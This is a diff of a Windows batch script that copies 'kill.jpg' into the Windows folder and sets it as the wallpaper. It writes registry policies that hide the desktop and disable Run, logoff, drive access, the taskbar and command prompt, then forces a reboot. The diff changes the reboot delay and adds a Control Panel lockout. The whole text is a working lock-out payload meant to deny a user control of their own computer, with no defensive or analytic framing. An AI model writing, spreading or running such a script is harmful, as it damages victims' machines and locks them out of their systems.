@@ -1,5 +1,5 @@
 copy kill.jpg %windir%\kill.jpg
-shutdown /r /t 2
+shutdown /r /t 5
 REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d  "%windir%\kill.jpg" /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoDesktop" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoRun" /t REG_DWORD /d 1 /f
@@ -8,9 +8,10 @@ REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Ex
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoRecentDocsMenu" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoLogOff" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoSetFolders" /t REG_DWORD /d 1 /f
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoDrives" /t REG_DWORD /d 0x03ffffff /f
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoDrives" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoSetTaskbar" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoClose" /t REG_DWORD /d 1 /f
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoControlPanel" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
